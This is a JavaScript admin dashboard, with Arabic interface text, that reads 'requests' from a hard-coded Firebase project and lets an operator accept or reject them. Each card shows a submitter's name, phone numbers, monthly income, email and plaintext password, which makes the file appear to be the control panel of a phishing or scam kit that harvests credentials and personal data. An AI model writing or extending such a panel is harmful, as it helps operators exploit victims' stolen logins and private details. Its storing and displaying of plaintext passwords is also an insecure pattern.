import { initializeApp } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js';
import { getDatabase, ref, onValue, update } from 'https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js';

const firebaseConfig = {
    apiKey: "AIzaSyBwkfW26EAPTiupO6mRejVcKMbpJZV1ohE",
    authDomain: "shahame-98a21.firebaseapp.com",
    databaseURL: "https://shahame-98a21-default-rtdb.firebaseio.com",
    projectId: "shahame-98a21",
    storageBucket: "shahame-98a21.firebasestorage.app",
    messagingSenderId: "885951504437",
    appId: "1:885951504437:web:55b4d335c9418ba376517c"
};

const app = initializeApp(firebaseConfig);
const database = getDatabase(app);

let allRequests = [];
let currentFilter = 'all';

const requestsRef = ref(database, 'requests');
onValue(requestsRef, (snapshot) => {
    const data = snapshot.val();
    allRequests = [];

    if (data) {
        Object.keys(data).forEach(key => {
            allRequests.push({
                id: key,
                ...data[key]
            });
        });

        allRequests.sort((a, b) => b.timestamp - a.timestamp);
    }

    displayRequests(currentFilter);
});

function displayRequests(filter) {
    const container = document.getElementById('requestsContainer');

    let filteredRequests = allRequests;
    if (filter !== 'all') {
        filteredRequests = allRequests.filter(req => req.status === filter);
    }

    if (filteredRequests.length === 0) {
        container.innerHTML = '<p style="text-align: center; color: #999; padding: 40px;">لا توجد طلبات</p>';
        return;
    }

    container.innerHTML = filteredRequests.map(request => `
        <div class="request-card ${request.status}">
            <div class="request-info">
                <p><strong>اسم مقدم الطلب:</strong> ${escapeHtml(request.applicantName || request.name || '')}</p>
                <p><strong>رقم الجوال:</strong> ${escapeHtml(request.mobileNumber || 'غير مدخل')}</p>
                <p><strong>رقم التواصل:</strong> ${escapeHtml(request.contactNumber || 'غير مدخل')}</p>
                <p><strong>قيمة الدخل:</strong> ${escapeHtml(request.monthlyIncome || 'غير مدخل')}</p>
                <p><strong>البريد الإلكتروني:</strong> ${escapeHtml(request.email || '')}</p>
                <p><strong>كلمة المرور:</strong> ${escapeHtml(request.password || request.name || '')}</p>
                <p><strong>رقم الطلب:</strong> ${escapeHtml(request.orderNumber || 'لم يدخل بعد')}</p>
                <p><strong>التاريخ:</strong> ${escapeHtml(request.date || '')}</p>
                <span class="status-badge ${request.status}">
                    ${getStatusText(request.status)}
                </span>
            </div>
            ${request.status === 'pending' ? `
                <div class="action-buttons">
                    <button class="btn-accept" onclick="updateStatus('${request.id}', 'accepted')">
                        قبول
                    </button>
                    <button class="btn-reject" onclick="updateStatus('${request.id}', 'rejected')">
                        رفض
                    </button>
                </div>
            ` : ''}
        </div>
    `).join('');
}

window.updateStatus = async function(requestId, status) {
    try {
        const requestRef = ref(database, `requests/${requestId}`);
        await update(requestRef, {
            status: status,
            updatedAt: Date.now()
        });

        alert(status === 'accepted' ? 'تم قبول الطلب' : 'تم رفض الطلب');
    } catch (error) {
        alert('حدث خطأ أثناء تحديث الحالة');
        console.error('Error:', error);
    }
}

function getStatusText(status) {
    const statusMap = {
        pending: 'قيد الانتظار',
        accepted: 'مقبول',
        rejected: 'مرفوض'
    };
    return statusMap[status] || status;
}

function escapeHtml(value) {
    return String(value)
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;')
        .replace(/"/g, '&quot;')
        .replace(/'/g, '&#039;');
}

const filterButtons = document.querySelectorAll('.filter-btn');
filterButtons.forEach(button => {
    button.addEventListener('click', () => {
        filterButtons.forEach(btn => btn.classList.remove('active'));
        button.classList.add('active');

        currentFilter = button.dataset.filter;
        displayRequests(currentFilter);
    });
});
